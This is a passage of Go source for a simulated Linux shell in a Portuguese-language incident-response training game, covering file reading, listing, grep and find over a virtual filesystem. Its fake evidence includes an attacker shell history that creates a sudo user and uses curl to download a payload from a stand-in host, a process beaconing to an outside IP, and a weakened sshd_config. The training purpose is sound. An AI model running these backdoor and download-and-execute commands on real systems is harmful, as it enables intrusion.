			result = append(result, p)
		}
	}
	dynamic := []string{}
	if elapsed >= 85 {
		dynamic = append(dynamic, "/var/tmp/.cache/unknown-worker", "/root/incident/suspicious.bin")
		if !g.Killed[731] {
			dynamic = append(dynamic, "/proc/731/cmdline", "/proc/731/status")
		}
	}
	if elapsed >= 50 {
		dynamic = append(dynamic, "/var/tmp/.update/.bash_history")
	}
	for _, p := range dynamic {
		if !virtualPathRemoved(g, p) && !seen[p] {
			seen[p] = true
			result = append(result, p)
		}
	}
	for _, cmd := range strings.Fields(knownCommandsText) {
		p := "/usr/bin/" + cmd
		if !virtualPathRemoved(g, p) && !seen[p] {
			seen[p] = true
			result = append(result, p)
		}
	}
	for _, p := range []string{"/bin/bash", "/bin/sh", "/bin/ls", "/bin/cat", "/bin/cp", "/bin/mv", "/bin/rm", "/bin/mkdir", "/bin/grep", "/sbin/init", "/sbin/ip", "/sbin/shutdown", "/usr/sbin/sshd", "/usr/sbin/useradd", "/usr/sbin/usermod", "/usr/sbin/iptables"} {
		if !virtualPathRemoved(g, p) && !seen[p] {
			seen[p] = true
			result = append(result, p)
		}
	}
	for p := range g.Files {
		if !virtualPathRemoved(g, p) && !seen[p] {
			seen[p] = true
			result = append(result, p)
		}
	}
	sort.Strings(result)
	return result
}

func virtualChildren(g *Session, dir string, elapsed int) map[string]bool {
	children := map[string]bool{}
	dir = path.Clean(dir)
	for _, p := range virtualAllDirs(g, elapsed) {
		if p == dir || path.Dir(p) != dir {
			continue
		}
		children[path.Base(p)] = true
	}
	for _, p := range virtualAllFiles(g, elapsed) {
		if path.Dir(p) != dir {
			continue
		}
		if _, ok := children[path.Base(p)]; !ok {
			children[path.Base(p)] = false
		}
	}
	return children
}

func virtualReadFile(g *Session, p string, elapsed int) (string, error) {
	p = path.Clean(p)
	if virtualIsDir(g, p, elapsed) {
		return "", fmt.Errorf("%s: é um diretório", p)
	}
	if !virtualIsFile(g, p, elapsed) {
		return "", fmt.Errorf("%s: arquivo ou diretório inexistente", p)
	}
	if content, ok := g.Files[p]; ok {
		return content, nil
	}
	switch p {
	case "/etc/passwd":
		return getentOutput([]string{"getent", "passwd"}, elapsed), nil
	case "/etc/group":
		return getentOutput([]string{"getent", "group"}, elapsed), nil
	case "/etc/shadow":
		return "root:$y$j9T$traininghash:20654:0:99999:7:::\nstudent:$y$j9T$studenthash:20640:0:99999:7:::", nil
	case "/etc/os-release":
		return "PRETTY_NAME=\"Debian GNU/Linux 12 (bookworm)\"\nNAME=\"Debian GNU/Linux\"\nVERSION_ID=\"12\"\nID=debian", nil
	case "/etc/hosts":
		return "127.0.0.1 localhost\n127.0.1.1 training-server\n10.0.0.15 ubuntu-prod-01", nil
	case "/etc/hostname":
		return "ubuntu-prod-01", nil
	case "/etc/resolv.conf":
		return "nameserver 10.0.0.53\nsearch corp.internal\noptions edns0 trust-ad", nil
	case "/etc/fstab":
		return "UUID=training-root / ext4 defaults 0 1\n/swapfile none swap sw 0 0", nil
	case "/etc/sudoers":
		return "Defaults env_reset\nroot ALL=(ALL:ALL) ALL\n%sudo ALL=(ALL:ALL) ALL", nil
	case "/etc/ssh/ssh_config":
		return "Host *\n    SendEnv LANG LC_*\n    HashKnownHosts yes", nil
	case "/etc/ssh/moduli":
		return "20260720120000 2 6 100 3071 5 01A3B5C7D9E1F3", nil
	case "/etc/ssh/sshd_config":
		extra := ""
		if elapsed >= 125 && !g.Restored[p] {
			extra = "\nPermitRootLogin yes\nPasswordAuthentication yes  # ALTERAÇÃO SUSPEITA"
		}
		return "Port 22\nPermitRootLogin prohibit-password\nPasswordAuthentication no\nUsePAM yes" + extra, nil
	case "/etc/systemd/system/ssh.service":
		return "[Unit]\nDescription=OpenBSD Secure Shell server\nAfter=network.target\n[Service]\nExecStart=/usr/sbin/sshd -D", nil
	case "/home/student/notes.txt":
		return "Checklist do laboratório:\n- revisar logs do SSH\n- conferir processos\n- validar regras do firewall", nil
	case "/root/.bashrc":
		return "export PS1='\\u@\\h:\\w# '\nalias ll='ls -alF'\nalias la='ls -A'", nil
	case "/root/.profile":
		return "if [ -n \"$BASH_VERSION\" ]; then\n  [ -f ~/.bashrc ] && . ~/.bashrc\nfi", nil
	case "/root/README.txt":
		return "GAME SOC - SI\nUse help para consultar comandos.\nO sistema de arquivos é virtual e isolado da VPS real.", nil
	case "/root/incident/evidence.log":
		return "Caso LUS-2026-0720\nHost: ubuntu-prod-01\nColeta iniciada pelo GAME SI.\nPreserve evidências antes de remover artefatos.", nil
	case "/root/incident/suspicious.bin", "/var/tmp/.cache/unknown-worker":
		return "ELF 64-bit payload simulado: unknown-worker\nSHA256: 19e90a-training-malware-731", nil
	case "/root/backups/sshd_config.clean", "/var/backups/sshd_config.clean":
		return "Port 22\nPermitRootLogin prohibit-password\nPasswordAuthentication no\nUsePAM yes", nil
	case "/var/log/auth.log", "/var/log/secure":
		return logsOutput(elapsed), nil
	case "/var/log/syslog":
		return "Jul 20 14:58:01 ubuntu-prod-01 systemd[1]: Started ARES training host.\n" + logsOutput(elapsed), nil
	case "/var/log/kern.log":
		return "Jul 20 14:58:00 kernel: Linux version 6.1.0-amd64\nJul 20 15:01:27 kernel: audit: PID 731 abriu execução desconhecida", nil
	case "/var/log/dpkg.log":
		return "2026-07-19 10:11:02 status installed openssh-server:amd64 1:9.2p1-2+deb12u3", nil
	case "/var/log/nginx/access.log":
		return "192.0.2.44 - - [20/Jul/2026:15:02:01 -0300] \"GET / HTTP/1.1\" 200 612", nil
	case "/var/log/nginx/error.log":
		return "2026/07/20 15:02:01 [notice] 204#204: training server ready", nil
	case "/var/www/html/index.html":
		return "<!doctype html><title>ubuntu-prod-01</title><h1>Training Server</h1>", nil
	case "/proc/meminfo":
		return "MemTotal:         524288 kB\nMemFree:           98304 kB\nMemAvailable:     276480 kB\nBuffers:           15360 kB\nCached:           191488 kB", nil
	case "/proc/loadavg":
		return conditional(elapsed >= 85 && !g.Killed[731], "1.84 0.92 0.31 2/98 731", "0.08 0.05 0.01 1/93 204"), nil
	case "/proc/cpuinfo":
		return "processor\t: 0\nvendor_id\t: GenuineIntel\nmodel name\t: Virtual CPU @ 2.40GHz\ncpu MHz\t\t: 2400.000", nil
	case "/proc/uptime":
		return "274620.42 269932.17", nil
	case "/proc/version":
		return "Linux version 6.1.0-amd64 (debian-kernel@lists.debian.org) x86_64 GNU/Linux", nil
	case "/proc/1/cmdline":
		return "/sbin/init", nil
	case "/proc/101/cmdline":
		return "/usr/sbin/sshd -D", nil
	case "/proc/204/cmdline":
		return "/usr/local/bin/web-server", nil
	case "/proc/731/cmdline":
		return "/var/tmp/.cache/unknown-worker --connect 198.51.100.42:443", nil
	case "/proc/1/status":
		return "Name:\tsystemd\nState:\tS (sleeping)\nPid:\t1\nUid:\t0\t0\t0\t0", nil
	case "/proc/101/status":
		return "Name:\tsshd\nState:\tS (sleeping)\nPid:\t101\nUid:\t0\t0\t0\t0", nil
	case "/proc/204/status":
		return "Name:\tweb-server\nState:\tS (sleeping)\nPid:\t204\nUid:\t33\t33\t33\t33", nil
	case "/proc/731/status":
		return "Name:\tunknown-worker\nState:\tR (running)\nPid:\t731\nUid:\t1002\t1002\t1002\t1002\nVmRSS:\t46600 kB", nil
	case "/var/tmp/.update/.bash_history":
		return "sudo useradd -m -G sudo system-update\ncurl -fsSL http://bad-domain.test/payload -o /var/tmp/.cache/unknown-worker\nchmod +x /var/tmp/.cache/unknown-worker", nil
	case "/usr/local/bin/web-server":
		return "ELF 64-bit executable (conteúdo binário omitido pela simulação)", nil
	}
	if strings.HasPrefix(p, "/usr/bin/") || strings.HasPrefix(p, "/usr/sbin/") || strings.HasPrefix(p, "/bin/") || strings.HasPrefix(p, "/sbin/") {
		return "ELF 64-bit executable (conteúdo binário omitido pela simulação)", nil
	}
	return "", fmt.Errorf("%s: conteúdo indisponível", p)
}

func fileContent(value string, elapsed int, g *Session) string {
	p := normalizeVirtualPath(g.Cwd, value)
	content, err := virtualReadFile(g, p, elapsed)
	if err != nil {
		return "cat: " + err.Error()
	}
	return content
}

func virtualLongEntry(g *Session, full string, name string, isDir bool, elapsed int) string {
	mode, owner, group, size := "-rw-r--r--", "root", "root", 0
	if isDir {
		mode, size = "drwxr-xr-x", 4096
	}
	if strings.HasPrefix(full, "/root") {
		owner, group = "root", "root"
	}
	if strings.HasPrefix(full, "/home/student") {
		owner, group = "student", "student"
	}
	if strings.HasPrefix(full, "/var/log") {
		group = "adm"
	}
	if !isDir {
		if content, err := virtualReadFile(g, full, elapsed); err == nil {
			size = len(content)
		}
	}
	marker := ""
	if full == "/etc/ssh/sshd_config" && elapsed >= 125 && !g.Restored[full] {
		marker = "  [ALTERADO]"
	}
	return fmt.Sprintf("%s 1 %-8s %-8s %6d Jul 20 15:04 %s%s", mode, owner, group, size, name, marker)
}

func lsCommand(g *Session, parts []string, elapsed int) string {
	showAll, long := false, false
	targets := []string{}
	for _, arg := range parts[1:] {
		if strings.HasPrefix(arg, "-") && arg != "-" {
			if strings.Contains(arg, "a") {
				showAll = true
			}
			if strings.Contains(arg, "l") {
				long = true
			}
			continue
		}
		targets = append(targets, arg)
	}
	if len(targets) == 0 {
		targets = []string{"."}
	}
	blocks := []string{}
	for _, target := range targets {
		p := normalizeVirtualPath(g.Cwd, target)
		if !virtualExists(g, p, elapsed) {
			blocks = append(blocks, "ls: não foi possível acessar '"+target+"': arquivo ou diretório inexistente")
			continue
		}
		if virtualIsFile(g, p, elapsed) {
			if long {
				blocks = append(blocks, virtualLongEntry(g, p, path.Base(p), false, elapsed))
			} else {
				blocks = append(blocks, target)
			}
			continue
		}
		children := virtualChildren(g, p, elapsed)
		names := make([]string, 0, len(children)+2)
		if showAll {
			names = append(names, ".", "..")
		}
		for name := range children {
			if strings.HasPrefix(name, ".") && !showAll {
				continue
			}
			names = append(names, name)
		}
		sort.Strings(names)
		lines := []string{}
		for _, name := range names {
			full := p
			isDir := true
			if name != "." && name != ".." {
				full = path.Join(p, name)
				isDir = children[name]
			}
			if long {
				lines = append(lines, virtualLongEntry(g, full, name, isDir, elapsed))
			} else if isDir && name != "." && name != ".." {
				lines = append(lines, name+"/")
			} else {
				lines = append(lines, name)
			}
		}
		text := strings.Join(lines, conditional(long, "\n", "  "))
		if len(targets) > 1 {
			text = target + ":\n" + text
		}
		blocks = append(blocks, text)
	}
	return strings.Join(blocks, "\n\n")
}

func treeCommand(g *Session, parts []string, elapsed int) string {
	target := "."
	maxDepth := 3
	for i := 1; i < len(parts); i++ {
		if parts[i] == "-L" && i+1 < len(parts) {
			if n, err := strconv.Atoi(parts[i+1]); err == nil && n >= 0 && n <= 8 {
				maxDepth = n
			}
			i++
			continue
		}
		if !strings.HasPrefix(parts[i], "-") {
			target = parts[i]
		}
	}
	root := normalizeVirtualPath(g.Cwd, target)
	if !virtualIsDir(g, root, elapsed) {
		return "tree: " + target + ": diretório inexistente"
	}
	lines := []string{target}
	dirs, files := 0, 0
	var walk func(string, string, int)
	walk = func(dir, prefix string, depth int) {
		if depth >= maxDepth {
			return
		}
		children := virtualChildren(g, dir, elapsed)
		names := make([]string, 0, len(children))
		for name := range children {
			if !strings.HasPrefix(name, ".") {
				names = append(names, name)
			}
		}
		sort.Strings(names)
		for i, name := range names {
			last := i == len(names)-1
			branch, next := "├── ", prefix+"│   "
			if last {
				branch, next = "└── ", prefix+"    "
			}
			isDir := children[name]
			suffix := ""
			if isDir {
				suffix = "/"
				dirs++
			} else {
				files++
			}
			lines = append(lines, prefix+branch+name+suffix)
			if isDir {
				walk(path.Join(dir, name), next, depth+1)
			}
		}
	}
	walk(root, "", 0)
	lines = append(lines, fmt.Sprintf("\n%d diretórios, %d arquivos", dirs, files))
	return strings.Join(lines, "\n")
}

func readFilesCommand(g *Session, cmd string, parts []string, elapsed int) string {
	files := []string{}
	for _, arg := range parts[1:] {
		if !strings.HasPrefix(arg, "-") {
			files = append(files, arg)
		}
	}
	if len(files) == 0 {
		return "Uso: " + cmd + " <arquivo>"
	}
	out := []string{}
	for _, value := range files {
		p := normalizeVirtualPath(g.Cwd, value)
		content, err := virtualReadFile(g, p, elapsed)
		if err != nil {
			out = append(out, cmd+": "+err.Error())
			continue
		}
		if len(files) > 1 {
			out = append(out, "==> "+value+" <==\n"+content)
		} else {
			out = append(out, content)
		}
	}
	return strings.Join(out, "\n")
}

func headTailCommand(g *Session, cmd string, parts []string, elapsed int) string {
	n := 10
	file := ""
	for i := 1; i < len(parts); i++ {
		if parts[i] == "-n" && i+1 < len(parts) {
			if parsed, err := strconv.Atoi(parts[i+1]); err == nil {
				n = parsed
			}
			i++
			continue
		}
		if strings.HasPrefix(parts[i], "-") && len(parts[i]) > 1 {
			if parsed, err := strconv.Atoi(strings.TrimPrefix(parts[i], "-")); err == nil {
				n = parsed
				continue
			}
		}
		file = parts[i]
	}
	if file == "" {
		return "Uso: " + cmd + " [-n N] <arquivo>"
	}
	content := fileContent(file, elapsed, g)
	if strings.HasPrefix(content, "cat: ") {
		return strings.Replace(content, "cat:", cmd+":", 1)
	}
	if cmd == "head" {
		return firstLines(content, n)
	}
	return lastLines(content, n)
}

func firstLines(text string, n int) string {
	if n < 0 {
		n = 0
	}
	lines := strings.Split(text, "\n")
	if len(lines) > n {
		lines = lines[:n]
	}
	return strings.Join(lines, "\n")
}
func lastLines(text string, n int) string {
	if n < 0 {
		n = 0
	}
	lines := strings.Split(text, "\n")
	if len(lines) > n {
		lines = lines[len(lines)-n:]
	}
	return strings.Join(lines, "\n")
}

func shellWords(input string) ([]string, error) {
	var words []string
	var current strings.Builder
	var quote rune
	escaped := false
	flush := func() {
		if current.Len() > 0 {
			words = append(words, current.String())
			current.Reset()
		}
	}
	for _, r := range input {
		if escaped {
			current.WriteRune(r)
			escaped = false
			continue
		}
		if r == '\\' && quote != '\'' {
			escaped = true
			continue
		}
		if quote != 0 {
			if r == quote {
				quote = 0
			} else {
				current.WriteRune(r)
			}
			continue
		}
		if r == '\'' || r == '"' {
			quote = r
			continue
		}
		if r == ' ' || r == '\t' || r == '\n' || r == '\r' {
			flush()
			continue
		}
		current.WriteRune(r)
	}
	if escaped {
		current.WriteRune('\\')
	}
	if quote != 0 {
		return nil, fmt.Errorf("aspas não fechadas")
	}
	flush()
	return words, nil
}

func splitSinglePipeline(input string) (string, string, bool) {
	var quote rune
	escaped := false
	for i, r := range input {
		if escaped {
			escaped = false
			continue
		}
		if r == '\\' && quote != '\'' {
			escaped = true
			continue
		}
		if quote != 0 {
			if r == quote {
				quote = 0
			}
			continue
		}
		if r == '\'' || r == '"' {
			quote = r
			continue
		}
		if r == '|' {
			left := strings.TrimSpace(input[:i])
			right := strings.TrimSpace(input[i+1:])
			if left == "" || right == "" {
				return "", "", false
			}
			return left, right, true
		}
	}
	return "", "", false
}

func isGrepName(name string) bool {
	return strings.EqualFold(name, "grep") || strings.EqualFold(name, "egrep") || strings.EqualFold(name, "fgrep")
}

func virtualFile(value string, elapsed int, g *Session) (string, error) {
	p := normalizeVirtualPath(g.Cwd, value)
	content, err := virtualReadFile(g, p, elapsed)
	if err != nil {
		return "", fmt.Errorf("grep: %s", err.Error())
	}
	return content, nil
}

func runVirtualGrep(parts []string, stdin string, elapsed int, g *Session) string {
	if len(parts) < 2 {
		return "Uso: grep [opções] <padrão> [arquivo]"
	}
	caseInsensitive, invertMatch, showLineNumber, countOnly := false, false, false, false
	fixedString := strings.EqualFold(parts[0], "fgrep")
	recursive := false
	idx := 1
	for idx < len(parts) && strings.HasPrefix(parts[idx], "-") && parts[idx] != "-" {
		if parts[idx] == "--" {
			idx++
			break
		}
		flags := strings.TrimPrefix(parts[idx], "-")
		for _, flag := range flags {
			switch flag {
			case 'i':
				caseInsensitive = true
			case 'v':
				invertMatch = true
			case 'n':
				showLineNumber = true
			case 'c':
				countOnly = true
			case 'F':
				fixedString = true
			case 'E', 'G':
				fixedString = false
			case 'r', 'R':
				recursive = true
			default:
				return "grep: opção não suportada na simulação: -" + string(flag)
			}
		}
		idx++
	}
	if idx >= len(parts) {
		return "Uso: grep [opções] <padrão> [arquivo]"
	}
	pattern := parts[idx]
	idx++
	expression := pattern
	if fixedString {
		expression = regexp.QuoteMeta(expression)
	}
	if caseInsensitive {
		expression = "(?i)" + expression
	}
	re, err := regexp.Compile(expression)
	if err != nil {
		return "grep: expressão inválida: " + err.Error()
	}

	type sourceItem struct{ name, text string }
	sources := []sourceItem{}
	if stdin != "" {
		sources = append(sources, sourceItem{"", stdin})
	}
	if idx < len(parts) {
		for ; idx < len(parts); idx++ {
			p := normalizeVirtualPath(g.Cwd, parts[idx])
			if virtualIsDir(g, p, elapsed) {
				if !recursive {
					return "grep: " + parts[idx] + ": é um diretório"
				}
				for _, file := range virtualAllFiles(g, elapsed) {
					if strings.HasPrefix(file, p+"/") {
						if text, e := virtualReadFile(g, file, elapsed); e == nil {
							sources = append(sources, sourceItem{file, text})
						}
					}
				}
				continue
			}
			text, e := virtualReadFile(g, p, elapsed)
			if e != nil {
				return "grep: " + e.Error()
			}
			sources = append(sources, sourceItem{parts[idx], text})
		}
	}
	if len(sources) == 0 {
		return ""
	}
	matchedLines := []string{}
	total := 0
	showName := len(sources) > 1 || recursive
	for _, src := range sources {
		localCount := 0
		for number, line := range strings.Split(src.text, "\n") {
			matched := re.MatchString(line)
			if invertMatch {
				matched = !matched
			}
			if !matched {
				continue
			}
			localCount++
			total++
			if countOnly {
				continue
			}
			prefix := ""
			if showName && src.name != "" {
				prefix += src.name + ":"
			}
			if showLineNumber {
				prefix += strconv.Itoa(number+1) + ":"
			}
			matchedLines = append(matchedLines, prefix+line)
		}
		if countOnly && showName {
			matchedLines = append(matchedLines, src.name+":"+strconv.Itoa(localCount))
		}
	}
	if countOnly && !showName {
		return strconv.Itoa(total)
	}
	return strings.Join(matchedLines, "\n")
}

func findCommand(g *Session, parts []string, elapsed int) string {
	root := g.Cwd
	pattern := "*"
	typeFilter := ""
	idx := 1
	if idx < len(parts) && !strings.HasPrefix(parts[idx], "-") {
		root = normalizeVirtualPath(g.Cwd, parts[idx])
		idx++
	}
	for idx < len(parts) {
		if parts[idx] == "-name" && idx+1 < len(parts) {
			pattern = parts[idx+1]
			idx += 2
			continue
		}
		if parts[idx] == "-type" && idx+1 < len(parts) {
			typeFilter = parts[idx+1]
			idx += 2
			continue
		}
		idx++
	}
	if !virtualIsDir(g, root, elapsed) {
		return "find: '" + root + "': arquivo ou diretório inexistente"
	}
	lines := []string{}
	if typeFilter != "f" {
		if ok, _ := path.Match(pattern, path.Base(root)); ok {
			lines = append(lines, root)
		}
	}
	if typeFilter != "f" {
		for _, p := range virtualAllDirs(g, elapsed) {
			if p == root || !strings.HasPrefix(p, root+"/") {
				continue
			}
			if ok, _ := path.Match(pattern, path.Base(p)); ok {
				lines = append(lines, p)
			}
		}
	}
	if typeFilter != "d" {
		for _, p := range virtualAllFiles(g, elapsed) {
			if !strings.HasPrefix(p, root+"/") {
				continue
			}
			if ok, _ := path.Match(pattern, path.Base(p)); ok {
				lines = append(lines, p)
			}
		}
	}
	sort.Strings(lines)
	return strings.Join(lines, "\n")
}

func statOutput(value string, elapsed int, g *Session) string {
	p := normalizeVirtualPath(g.Cwd, value)
	if !virtualExists(g, p, elapsed) {
		return "stat: não foi possível obter estado de '" + value + "': arquivo ou diretório inexistente"
	}
	isDir := virtualIsDir(g, p, elapsed)
	size, mode := 4096, "0755/drwxr-xr-x"
	if !isDir {
		mode = "0644/-rw-r--r--"
		if content, err := virtualReadFile(g, p, elapsed); err == nil {
			size = len(content)
		}
	}
	modified := "2026-07-19 10:00:00.000000000 -0300"
	marker := ""
	if p == "/etc/ssh/sshd_config" && elapsed >= 125 && !g.Restored[p] {
		modified = time.Now().Format("2006-01-02 15:04:05.000000000 -0300")
		marker = " [ALTERAÇÃO RECENTE]"
	}
	return fmt.Sprintf("  File: %s\n  Size: %d       Blocks: 8          IO Block: 4096 %s\nDevice: 254,1   Inode: 731       Links: 1\nAccess: (%s)  Uid: (0/root) Gid: (0/root)\nModify: %s%s", p, size, conditional(isDir, "directory", "regular file"), mode, modified, marker)
}

func fileTypeOutput(g *Session, value string, elapsed int) string {
	p := normalizeVirtualPath(g.Cwd, value)
	if virtualIsDir(g, p, elapsed) {
		return value + ": directory"
	}
	if !virtualIsFile(g, p, elapsed) {
		return "file: " + value + ": arquivo ou diretório inexistente"
	}
	if strings.Contains(p, "suspicious") || strings.Contains(p, "unknown-worker") || strings.HasPrefix(p, "/usr/bin/") || strings.HasPrefix(p, "/usr/sbin/") || strings.HasPrefix(p, "/bin/") || strings.HasPrefix(p, "/sbin/") || p == "/usr/local/bin/web-server" {
		return value + ": ELF 64-bit LSB executable, x86-64, stripped"
	}
	if strings.HasSuffix(p, ".html") {
		return value + ": HTML document, ASCII text"
	}
	if strings.HasSuffix(p, ".log") {
		return value + ": ASCII text"
	}
	return value + ": Unicode text, UTF-8 text"
}

func checksumOutput(value string, elapsed int, g *Session, algo string) string {
	p := normalizeVirtualPath(g.Cwd, value)
	if !virtualIsFile(g, p, elapsed) {
		return algo + ": " + value + ": arquivo ou diretório inexistente"
	}
	sum := "6f8d1c75c13bcf8a4b7b947f6190b2cf14d9a1b7f5aa23597d756d6f6eac4142"
	if p == "/etc/ssh/sshd_config" && elapsed >= 125 && !g.Restored[p] {
		sum = "deadc0de7b66ab12c04e44bf7e5321c6e201e80b6cd2fd7b988aa7e0316f9871"
	}
	if content, ok := g.Files[p]; ok {
		seed := fmt.Sprintf("%x", []byte(content))
		if len(seed) < 64 {
			seed += strings.Repeat("0", 64-len(seed))
		}
		sum = seed[:64]
	}
	if algo == "md5sum" {
		sum = sum[:32]
	}
	return sum + "  " + value
}

func wcCommand(g *Session, parts []string, elapsed int) string {
	if len(parts) < 2 {
		return "Uso: wc [-lwc] <arquivo>"
	}
	files := []string{}
	for _, arg := range parts[1:] {
		if !strings.HasPrefix(arg, "-") {
			files = append(files, arg)
		}
	}
	lines := []string{}
	for _, value := range files {
		p := normalizeVirtualPath(g.Cwd, value)
		content, err := virtualReadFile(g, p, elapsed)
		if err != nil {
			lines = append(lines, "wc: "+err.Error())
			continue
		}
		lineCount := 0
		if content != "" {
			lineCount = strings.Count(content, "\n") + 1
		}
		lines = append(lines, fmt.Sprintf("%7d %7d %7d %s", lineCount, len(strings.Fields(content)), len(content), value))
	}
	return strings.Join(lines, "\n")
}

func duCommand(g *Session, parts []string, elapsed int) string {
	target := "."
	for _, arg := range parts[1:] {
		if !strings.HasPrefix(arg, "-") {
			target = arg
		}
	}
	p := normalizeVirtualPath(g.Cwd, target)
	if !virtualExists(g, p, elapsed) {
		return "du: não foi possível acessar '" + target + "'"
	}
	size := 0
	if virtualIsFile(g, p, elapsed) {
		if c, e := virtualReadFile(g, p, elapsed); e == nil {
			size = len(c)
		}
	} else {
		for _, file := range virtualAllFiles(g, elapsed) {
			if strings.HasPrefix(file, p+"/") {
				if c, e := virtualReadFile(g, file, elapsed); e == nil {
					size += len(c)
				}
			}
		}
	}
	kb := (size + 1023) / 1024
	if kb < 4 {
		kb = 4
	}
	return fmt.Sprintf("%dK\t%s", kb, target)
}

func cdCommand(g *Session, parts []string, elapsed int) string {
	target := "~"
	if len(parts) > 1 {
		target = parts[1]
	}
	if len(parts) > 2 {
		return "bash: cd: argumentos demais"
	}
	if target == "-" {
		if g.PrevCwd == "" {
			return "bash: cd: OLDPWD não definido"
		}
		old := g.Cwd
		g.Cwd = g.PrevCwd
		g.PrevCwd = old
		return g.Cwd
	}
	dest := normalizeVirtualPath(g.Cwd, target)
	if !virtualExists(g, dest, elapsed) {
		return "bash: cd: " + target + ": arquivo ou diretório inexistente"
	}
	if !virtualIsDir(g, dest, elapsed) {
		return "bash: cd: " + target + ": não é um diretório"
	}
	if dest != g.Cwd {
		g.PrevCwd, g.Cwd = g.Cwd, dest
	}
	return ""
}

func ensureVirtualDir(g *Session, dir string, elapsed int, recursive bool) error {
	dir = path.Clean(dir)
	if virtualIsDir(g, dir, elapsed) {
		return nil
	}
	if virtualIsFile(g, dir, elapsed) {
		return fmt.Errorf("%s: arquivo já existe", dir)
	}
	parent := path.Dir(dir)
	if !virtualIsDir(g, parent, elapsed) {
		if !recursive {
			return fmt.Errorf("%s: diretório pai inexistente", parent)
		}
		if err := ensureVirtualDir(g, parent, elapsed, true); err != nil {
			return err
		}
	}
	delete(g.Removed, dir)
	g.Dirs[dir] = true
	return nil
}

func mkdirCommand(g *Session, parts []string, elapsed int) string {
	recursive := false
	targets := []string{}
	for _, arg := range parts[1:] {
		if arg == "-p" {
			recursive = true
		} else if !strings.HasPrefix(arg, "-") {
			targets = append(targets, arg)
		}
	}
	if len(targets) == 0 {
		return "mkdir: operando ausente"
	}
	errors := []string{}
	for _, value := range targets {
		p := normalizeVirtualPath(g.Cwd, value)
		if virtualExists(g, p, elapsed) {
			if !recursive {
				errors = append(errors, "mkdir: não foi possível criar o diretório '"+value+"': arquivo existe")
			}
			continue
		}
		if err := ensureVirtualDir(g, p, elapsed, recursive); err != nil {
			errors = append(errors, "mkdir: "+err.Error())
		}
	}
	return strings.Join(errors, "\n")
}

func touchCommand(g *Session, parts []string, elapsed int) string {
	targets := []string{}
	for _, arg := range parts[1:] {
		if !strings.HasPrefix(arg, "-") {
			targets = append(targets, arg)
		}
	}
	if len(targets) == 0 {
		return "touch: operando ausente"
	}
	errors := []string{}
	for _, value := range targets {
		p := normalizeVirtualPath(g.Cwd, value)
		if virtualIsDir(g, p, elapsed) {
			errors = append(errors, "touch: não foi possível tocar '"+value+"': é um diretório")
			continue
		}
		if !virtualIsDir(g, path.Dir(p), elapsed) {
			errors = append(errors, "touch: não foi possível tocar '"+value+"': diretório pai inexistente")
			continue
		}
		delete(g.Removed, p)
		if _, ok := g.Files[p]; !ok && !virtualStaticFile(p, elapsed, g) {
			g.Files[p] = ""
		}
	}
	return strings.Join(errors, "\n")
}

func protectedVirtualPath(p string) bool {
	protected := map[string]bool{"/": true, "/bin": true, "/etc": true, "/home": true, "/proc": true, "/root": true, "/usr": true, "/var": true}
	return protected[p]
}

func rmCommand(g *Session, parts []string, elapsed int) string {
	recursive, force := false, false
	targets := []string{}
	for _, arg := range parts[1:] {
		if strings.HasPrefix(arg, "-") {
			if strings.Contains(arg, "r") || strings.Contains(arg, "R") {
				recursive = true
			}
			if strings.Contains(arg, "f") {
				force = true
			}
			continue
		}
		targets = append(targets, arg)
	}
	if len(targets) == 0 {
		return "rm: operando ausente"
	}
	errors := []string{}
	for _, value := range targets {
		p := normalizeVirtualPath(g.Cwd, value)
		if protectedVirtualPath(p) {
			errors = append(errors, "rm: não é permitido remover '"+value+"' no laboratório")
			continue
		}
		if !virtualExists(g, p, elapsed) {
			if !force {
				errors = append(errors, "rm: não foi possível remover '"+value+"': arquivo ou diretório inexistente")
			}
			continue
		}
		if virtualIsDir(g, p, elapsed) && !recursive {
			errors = append(errors, "rm: não foi possível remover '"+value+"': é um diretório")
			continue
		}
		delete(g.Files, p)
		delete(g.Dirs, p)
		g.Removed[p] = true
		for file := range g.Files {
			if strings.HasPrefix(file, p+"/") {
				delete(g.Files, file)
			}
		}
		for dir := range g.Dirs {
			if strings.HasPrefix(dir, p+"/") {
				delete(g.Dirs, dir)
			}
		}
	}
	return strings.Join(errors, "\n")
}

func rmdirCommand(g *Session, parts []string, elapsed int) string {
	if len(parts) < 2 {
		return "rmdir: operando ausente"
	}
	errors := []string{}
	for _, value := range parts[1:] {
		p := normalizeVirtualPath(g.Cwd, value)
		if protectedVirtualPath(p) {
			errors = append(errors, "rmdir: falha ao remover '"+value+"': diretório protegido")
			continue
		}
		if !virtualIsDir(g, p, elapsed) {
			errors = append(errors, "rmdir: falha ao remover '"+value+"': diretório inexistente")
			continue
		}
		if len(virtualChildren(g, p, elapsed)) > 0 {
			errors = append(errors, "rmdir: falha ao remover '"+value+"': diretório não vazio")
			continue
		}
		delete(g.Dirs, p)
		g.Removed[p] = true
	}
	return strings.Join(errors, "\n")
}

func writeVirtualFile(g *Session, value, content string, appendMode bool, elapsed int) error {
	p := normalizeVirtualPath(g.Cwd, value)
	if virtualIsDir(g, p, elapsed) {
		return fmt.Errorf("%s: é um diretório", value)
	}
	if !virtualIsDir(g, path.Dir(p), elapsed) {
		return fmt.Errorf("%s: diretório pai inexistente", value)
	}
	delete(g.Removed, p)
	if appendMode {
		if old, err := virtualReadFile(g, p, elapsed); err == nil {
			content = old + content
		}
	}
	g.Files[p] = content
	return nil
}

func splitRedirection(input string) (string, string, string, bool) {
	var quote rune
	escaped := false
	for i := 0; i < len(input); i++ {
		r := rune(input[i])
		if escaped {
			escaped = false
			continue
		}
		if r == '\\' && quote != '\'' {
			escaped = true
			continue
		}
		if quote != 0 {
			if r == quote {
				quote = 0
			}
			continue
		}
		if r == '\'' || r == '"' {
			quote = r
			continue
		}
		if r == '>' {
			op := ">"
			end := i + 1
			if end < len(input) && input[end] == '>' {
				op = ">>"
				end++
			}
			return strings.TrimSpace(input[:i]), op, strings.TrimSpace(input[end:]), true
		}
	}
	return "", "", "", false
}

func echoCommand(g *Session, raw string, elapsed int) string {
	left, op, target, redirected := splitRedirection(raw)
	words, err := shellWords(conditional(redirected, left, raw))
	if err != nil {
		return "bash: " + err.Error()
	}
	if len(words) == 0 {
		return ""
	}
	text := ""
	if len(words) > 1 {
		text = strings.Join(words[1:], " ")
	}
	if words[0] == "printf" {
		text = strings.ReplaceAll(text, "\\n", "\n")
	} else {
		text += "\n"
	}
	if !redirected {
		return strings.TrimSuffix(text, "\n")
	}
	if target == "" {
		return "bash: erro de sintaxe próximo ao token inesperado 'nova linha'"
	}
	if err := writeVirtualFile(g, target, text, op == ">>", elapsed); err != nil {
		return "bash: " + err.Error()
	}
	return ""
}

